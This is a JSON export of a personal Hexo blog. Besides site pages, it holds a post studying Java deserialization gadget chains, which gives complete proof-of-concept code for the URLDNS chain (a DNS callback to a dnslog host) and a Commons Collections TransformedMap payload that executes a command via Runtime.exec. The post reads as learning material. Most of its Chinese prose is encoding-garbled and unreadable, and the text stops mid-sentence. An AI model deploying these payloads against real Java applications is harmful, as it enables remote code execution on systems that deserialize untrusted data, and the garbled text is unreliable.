{"meta":{"title":"Pp1ove","subtitle":null,"description":null,"author":"Pp1ove","url":"https://pp1ove.gitee.io"},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-01-01T13:06:03.809Z","comments":false,"path":"about/index.html","permalink":"https://pp1ove.gitee.io/about/index.html","excerpt":"","text":"[ã•ãã‚‰è˜ã®Pp1ove] ä¸&nbsp; Pp1ove&nbsp; ï¼ˆ çœŸï¼ˆã¾ï¼‰ç™½ï¼ˆã—ã‚ï¼‰ ï¼‰ å¯¹è¯ä¸­... bot_ui_ini()","keywords":"å…³äº"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://pp1ove.gitee.io/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"client/index.html","permalink":"https://pp1ove.gitee.io/client/index.html","excerpt":"","text":"ç›´æ¥ä¸‹è½½ or æ‰«ç ä¸‹è½½ï¼š","keywords":"Androidå®¢æˆ·ç«¯"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"https://pp1ove.gitee.io/comment/index.html","excerpt":"","text":"å¿µä¸¤å¥è¯— å™åˆ«æ¢¦ã€æ‰¬å·ä¸€è§‰ã€‚ ã€å®‹ä»£ã€‘å´æ–‡è‹±ã€Šå¤œæ¸¸å®«Â·äººå»è¥¿æ¥¼é›æ³ã€‹","keywords":"ç•™è¨€æ¿"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"https://pp1ove.gitee.io/donate/index.html","excerpt":"","text":"","keywords":"è°¢è°¢é¥²ä¸»äº†å–µ~"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-01-01T14:55:48.877Z","comments":false,"path":"music/index.html","permalink":"https://pp1ove.gitee.io/music/index.html","excerpt":"","text":"","keywords":"å–œæ¬¢çš„éŸ³ä¹"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://pp1ove.gitee.io/lab/index.html","excerpt":"","text":"sakuraä¸»é¢˜balabala","keywords":"Labå®éªŒå®¤"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"links/index.html","permalink":"https://pp1ove.gitee.io/links/index.html","excerpt":"","text":"","keywords":"å‹äººå¸"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://pp1ove.gitee.io/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://pp1ove.gitee.io/tags/index.html","excerpt":"","text":""},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://pp1ove.gitee.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: 'æ”¾é€æ—¶é—´: 2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: '2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} ç•ªç»„è®¡åˆ’ è¿™é‡Œå°†æ˜¯æ°¸è¿œçš„å›å¿† window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} æ”¾é€æ—¶é—´: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"Bç«™"},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-01-14T03:38:55.581Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://pp1ove.gitee.io/theme-sakura/index.html","excerpt":"","text":"","keywords":"Hexo ä¸»é¢˜ Sakura ğŸŒ¸"}],"posts":[{"title":"CCé“¾å­¦ä¹ -ä¸Š","slug":"CCé“¾å­¦ä¹ -ä¸Š","date":"2021-07-13T03:03:25.000Z","updated":"2021-07-19T13:00:57.611Z","comments":false,"path":"2021/07/13/CCé“¾å­¦ä¹ -ä¸Š/","link":"","permalink":"https://pp1ove.gitee.io/2021/07/13/CCé“¾å­¦ä¹ -ä¸Š/","excerpt":"","text":"å‰è¨€æœ¬æ–‡ä¸»è¦å‚è€ƒPç¥çš„javaæ¼«è°ˆ,ä»¥åŠä¸€äº›ç½‘ä¸Šçš„èµ„æ–™,åŠ ä¸Šä¸€äº›è‡ªå·±çš„æ€è€ƒã€‚å› ä¸ºæˆ‘ä¹Ÿæ¥è§¦javaæ²¡å¤šä¹…,æ–‡ç« å¯¹äºå’Œæˆ‘ä¸€æ ·çš„å°ç™½æ¥è¯´å¯èƒ½å°±æ¯”è¾ƒå‹å¥½ã€‚å¯èƒ½ä¹Ÿä¼šæœ‰ä¸€äº›ç†è§£æ–¹é¢çš„é”™è¯¯,æ¬¢è¿å¸ˆå‚…ä»¬æŒ‡æ­£ã€‚ URLDNSURLDNSæ˜¯ysoserialä¸­æœ€ç®€å•çš„ä¸€æ¡åˆ©ç”¨é“¾,å› ä¸ºå…¶å¦‚ä¸‹çš„ä¼˜ç‚¹,â¾®å¸¸é€‚åˆæˆ‘ä»¬åœ¨æ£€æµ‹ååºåˆ—åŒ–æ¼æ´æ—¶ä½¿â½¤ï¼š ä½¿â½¤Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰â½…åº“æ²¡æœ‰ä¾èµ– åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ åœ¨ysoserialä¸‹ç”ŸæˆURLDNSå‘½ä»¤ä¸º: java -jar .\\ysoserial.jar URLDNS &quot;http://xxx.dnslog.cn&quot; å¤§è‡´æµç¨‹ä¸º: HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() URLDNS.java å…³é”®çš„ä»£ç åªæœ‰ç®€ç®€å•å•çš„å››åå¤šè¡Œ åˆ©ç”¨é“¾ HashMap.readObject() HashMap.putVal() HashMap.hash() * URL.hashCode() åŸç†åˆ†æå…ˆè´´poc,å¤§å®¶å¯ä»¥ä¸€è¾¹è°ƒè¯•ä¸€è¾¹åˆ†æ import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static Object urldns() throws Exception{ //æ¼æ´å‡ºå‘ç‚¹ hashmapï¼Œå®ä¾‹åŒ–å‡ºæ¥ HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); //URLå¯¹è±¡ä¼ å…¥è‡ªå·±æµ‹è¯•çš„dnslog URL url = new URL(&quot;http://txbjb7.dnslog.cn&quot;); //åå°„è·å– URLçš„hashcodeæ–¹æ³• Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //ä½¿ç”¨å†…éƒ¨æ–¹æ³• f.setAccessible(true); // hashMap.putæ—¶ä¼šè°ƒç”¨hash(key),è¿™é‡Œå…ˆæŠŠhashCodeè®¾ç½®ä¸ºå…¶ä»–å€¼,é¿å…å’Œåé¢çš„DNSè¯·æ±‚æ··æ·† f.set(url, 0xAAA); hashMap.put(url, &quot;Yasax1&quot;); // hashCode è¿™ä¸ªå±æ€§æ”¾è¿›å»åè®¾å› -1, è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šé‡æ–°è®¡ç®— hashCode f.set(url, -1); // åºåˆ—åŒ–æˆå¯¹è±¡ï¼Œè¾“å‡ºå‡ºæ¥ return hashMap; } public static void main(String[] args) throws Exception { payload2File(urldns(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //å°†æ„é€ å¥½çš„payloadåºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­ ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //è¯»å–å†™å…¥çš„payloadï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ– ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } é¦–å…ˆåœ¨HashMapç±»ä¸­,æœ‰å‡ºå‘ååºåˆ—åŒ–çš„æ–¹æ³•readObject,æ‰¾åˆ°HashMapç±»ä¸­çš„readobjectæ–¹æ³• åœ¨readObjectæ–¹æ³•çš„æœ€åä¸€æ’,è°ƒç”¨äº†hashæ–¹æ³•,ç„¶ååˆè°ƒç”¨äº†keyçš„hashCode()æ–¹æ³•,è¿™é‡Œæˆ‘ä»¬çš„keyå¯æ§ æ¥ä¸‹æ¥åœ¨java.net.URLç±»ä¸­,å­˜åœ¨ä¸€ä¸ªhashCode()æ–¹æ³•, è¿™é‡Œçš„handleræ˜¯ä¸€ä¸ªURLStreamHandler å¯¹è±¡,è·Ÿè¿›ä»–çš„hashCodeæ–¹æ³•,ä¸è¿‡è¿™é‡Œæˆ‘ä»¬è¿›å…¥handler.hashCodeæœ‰ä¸€ä¸ªå‰æ,å°±æ˜¯æˆ‘ä»¬çš„hashCode=-1; è·Ÿè¿›getHostAddressæ–¹æ³• è¿™é‡Œæœ‰ä¸€ä¸ªInetAddress.getByName(host),è·å–ç›®æ ‡ipåœ°å€,å…¶å®åœ¨ç½‘ç»œä¸­å°±æ˜¯ä¸€æ¬¡DNSè¯·æ±‚. æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦newä¸€ä¸ªhashmap,ç„¶åè®©å®ƒçš„keyç­‰äºä¸€ä¸ªjava.net.URLå¯¹è±¡,ç„¶å,è®¾ç½®è¿™ä¸ª URL å¯¹è±¡çš„ hashCode ä¸ºåˆå§‹å€¼ -1 ,è¿™æ ·ååºåˆ—åŒ–æ—¶å°†ä¼šé‡æ–°è®¡ç®—å…¶ hashCode ,æ‰èƒ½è§¦å‘åˆ°åâ¾¯çš„DNSè¯·æ±‚,åˆ°æ­¤æˆ‘ä»¬çš„é“¾å­å°±æ„é€ å®Œæˆäº† ä¸è¿‡ysoserialè·Ÿæˆ‘ä»¬çš„expæœ‰ä¸€äº›ä¸åŒ,é‚£æ˜¯å› ä¸ºysoserialä¸ºäº†é˜²â½Œåœ¨â½£æˆPayloadçš„æ—¶å€™ä¹Ÿæ‰§â¾äº†URLè¯·æ±‚å’ŒDNSæŸ¥è¯¢,é‡å†™äº†ä¸€ä¸ªSilentURLStreamHandlerç±»,è¿™å’Œæˆ‘ä»¬çš„expä¸­çš„ f.set(url, 0xAAA);æ˜¯ä¸€æ ·çš„æ•ˆæœ æµç¨‹å›¾ CC1å‰è¨€Commons Collectionsçš„åˆ©ç”¨é“¾ä¹Ÿè¢«ç§°ä¸ºccé“¾ï¼Œåœ¨å­¦ä¹ ååºåˆ—åŒ–æ¼æ´å¿…ä¸å¯å°‘çš„ä¸€ä¸ªéƒ¨åˆ†ã€‚Apache Commons Collectionsæ˜¯Javaä¸­åº”ç”¨å¹¿æ³›çš„ä¸€ä¸ªåº“ï¼ŒåŒ…æ‹¬Weblogicã€JBossã€WebSphereã€Jenkinsç­‰çŸ¥åå¤§å‹Javaåº”ç”¨éƒ½ä½¿ç”¨äº†è¿™ä¸ªåº“ã€‚CC1æŒ‡çš„æ˜¯lazymapé‚£æ¡é“¾å­,ä½†æ˜¯ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºtransformedmapçš„åˆ†æ,è¿™é‡Œä¹Ÿåˆ†æä¸€ä¸‹ã€‚è¿˜æœ‰å°±æ˜¯CC1çš„æµ‹è¯•ç¯å¢ƒéœ€è¦åœ¨Java 8u71ä»¥å‰ã€‚åœ¨æ­¤æ”¹åŠ¨åï¼ŒAnnotationInvocationHandler#readObjectä¸å†ç›´æ¥ä½¿â½¤ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œâ½½æ˜¯æ–°å»ºäº†â¼€ä¸ªLinkedHashMapå¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„LinkedHashMapå¯¹è±¡ï¼Œâ½½åŸæ¥æˆ‘ä»¬ç²¾â¼¼æ„é€ çš„Mapä¸å†æ‰§â¾setæˆ–putæ“ä½œï¼Œ æµ‹è¯•ç¯å¢ƒ JDK 1.7 Commons Collections 3.1 transformedmapé“¾POCimport java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.annotation.RetentionPolicy; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Method; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; public class CommonCollections11 { public static Object generatePayload() throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;calc&quot; }) }; //è¿™é‡Œå’Œæˆ‘ä¸Šé¢è¯´çš„æœ‰ä¸€ç‚¹ç‚¹ä¸åŒ,å› ä¸ºRuntime.getRuntime()æ²¡æœ‰å®ç°Serializableæ¥â¼,æ‰€ä»¥è¿™é‡Œç”¨çš„Runtime.classã€‚classç±»å®ç°äº†serializableæ¥â¼ Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(&quot;value&quot;, &quot;xxx&quot;); Map outmap = TransformedMap.decorate(innermap, null, transformerChain); //é€šè¿‡åå°„è·å¾—AnnotationInvocationHandlerç±»å¯¹è±¡ Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //é€šè¿‡åå°„è·å¾—clsçš„æ„é€ å‡½æ•° Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); //è¿™é‡Œéœ€è¦è®¾ç½®Accessibleä¸ºtrueï¼Œå¦åˆ™åºåˆ—åŒ–å¤±è´¥ ctor.setAccessible(true); //é€šè¿‡newInstance()æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡ Object instance = ctor.newInstance(Retention.class, outmap); return instance; } public static void main(String[] args) throws Exception { payload2File(generatePayload(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //å°†æ„é€ å¥½çš„payloadåºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­ ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //è¯»å–å†™å…¥çš„payloadï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ– ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } è°ƒç”¨é“¾ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() TransformedMapTransformedMapâ½¤äºå¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšâ¼€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Mapåœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§â¾â¼€ä¸ªå›è°ƒã€‚ è¿™é‡Œå®ƒçš„æ„é€ æ–¹æ³•ä¸ºprotectedç±»å‹,åˆ›å»ºå¯¹è±¡éœ€è¦é€šè¿‡TransformedMap.decorate()æ¥è·å¾—ä¸€ä¸ªTransformedMapå®ä¾‹ Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer); åœ¨TransformedMapç±»ä¸­æœ‰ä¸‰ä¸ªæ–¹æ³•,å®ƒä¼šæ‰§è¡Œä¼ å…¥çš„å‚æ•°çš„transform()æ–¹æ³• transformertransformeræ˜¯ä¸€ä¸ªæ¥å£,å®ƒåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„æ–¹æ³• public interface Transformer { public Object transform(Object input); } ConstantTransformer ConstantTransformerå‡½æ•°æ˜¯å®ç°transformeræ¥å£çš„ä¸€ä¸ªç±»,åœ¨è¯¥å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°,ä¼šä¼ å…¥æˆ‘ä»¬çš„Object,åœ¨transformæ–¹æ³•ä¸­åˆä¼šå°†è¯¥Objectè¿”å› InvokerTransformerè¯¥ç±»çš„æ„é€ æ–¹æ³•ä¸­ä¼ å…¥ä¸‰ä¸ªå˜é‡,åˆ†åˆ«æ˜¯æ–¹æ³•å,å‚æ•°çš„ç±»å‹,å’Œå‚æ•° ç„¶ååˆä¼šåœ¨transformæ–¹æ³•ä¸­åˆ©ç”¨åå°„çš„çŸ¥è¯†,æ‰§è¡Œäº†inputå¯¹è±¡çš„iMethodName,ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜,å°±æ˜¯transformæ–¹æ³•ä¸­çš„inputå¯¹è±¡æˆ‘ä»¬å¹¶ä¸èƒ½æ§åˆ¶,è¿™é‡Œå°±è¦ç”¨åˆ°æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹ ChainedTransformerè¯¥æ–¹æ³•é¦–å…ˆæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°,å°†ä¼ å…¥çš„Transformerç±»å‹çš„æ•°ç»„èµ‹å€¼ç»™iTransformers,è¿™é‡ŒiTransformersæ˜¯ä¸€ä¸ªæ•°ç»„ è€Œåœ¨è¯¥å‡½æ•°çš„transformæ–¹æ³•ä¸­,æœ‰æ„æ€çš„æ¥äº† å®ƒä¼šå°†å‰ä¸€ä¸ªtransformè¿”å›çš„ç»“æœä½œä¸ºåä¸€ä¸ªå¯¹è±¡çš„ä¼ å‚,å‡è®¾æˆ‘ä»¬ä¼ å…¥çš„Transformer[]æ•°ç»„ä¸­æœ‰ä¸¤ä¸ªæ•°æ® new ConstantTransformer(Runtime.getRuntime()) new InvokerTransformer(â€œexecâ€, new Class[]{String.class},new Object[{â€œcalcâ€}) è¿™æ 